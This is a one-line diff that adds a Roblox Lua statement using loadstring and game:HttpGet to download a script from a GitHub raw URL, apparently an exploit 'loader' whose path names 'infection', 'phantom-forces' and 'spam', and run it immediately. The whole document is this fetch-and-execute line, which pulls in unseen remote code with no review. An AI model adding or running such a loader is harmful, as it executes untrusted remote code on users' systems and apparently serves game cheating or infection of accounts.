@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/infection-phantom-forces-spam5-9jl5gwyyop6eor.lua"))()
